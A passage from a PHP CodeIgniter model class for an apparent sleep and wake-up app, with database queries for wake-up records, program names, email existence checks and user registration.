            $this->db->where("DATE(created_at) <=", date('Y-m-d'));
        }
        
        $this->db->order_by("id", "DESC");
        $result = $this->db->get();
        
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }

    }
    
    public function getWakeUpForFeedBack($userID, $dateRange) {
        $this->db->select("created_at");
        $this->db->from("wake_up_saver");
        $this->db->where("DATE(created_at) >=", date('Y-m-d', strtotime($dateRange)));
        $this->db->where("user_id", $userID);
        $result = $this->db->get();
        
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getuserprogram($id) {
        $this->db->select('program_name as program_name');
        $this->db->from('sleep_enhancer_programs');
        $this->db->where('id', $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
       
    }
    
    
    public function getWakeUpSaverByDate($userID, $date) {
        $this->db->select('time');
        $this->db->from('wake_up_saver');
        $this->db->where('user_id', $userID);
        $this->db->where('DATE(created_at)', date('Y-m-d', strtotime($date)));
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
        public function checkIfEmailExists($email) {
        $this->db->select('id');
        $this->db->from('registeredusers');
        $this->db->where('email', $email);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }

    public function register_user($registerArr) {
        if ($this->db->insert("registeredusers", $registerArr)) {
            return $this->db->insert_id();
        } else {
            return false;
        }
    }
}

?>